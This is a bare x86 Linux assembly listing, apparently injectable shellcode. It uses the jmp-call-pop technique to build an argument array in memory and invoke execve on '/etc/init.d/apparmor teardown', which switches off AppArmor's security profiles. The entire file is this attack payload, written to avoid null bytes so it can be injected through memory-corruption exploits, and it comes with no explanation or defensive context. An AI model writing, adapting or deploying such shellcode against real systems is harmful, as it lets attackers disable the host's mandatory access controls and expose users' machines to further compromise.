global _start

section .text

_start:

	xor ebx,ebx
	mul ebx
	jmp short one

two:
	pop ebx

	mov [ebx+20], edx
	mov [ebx+32], edx
	mov [ebx+36], ebx
	lea ecx, [ebx+24]
	mov [ebx+40], ecx

	lea ecx, [ebx+36]
	lea edx, [ebx+32]
	mov al,0xb
	int 0x80
one:
	call two
	db '/etc/init.d/apparmorXXXXteardown'
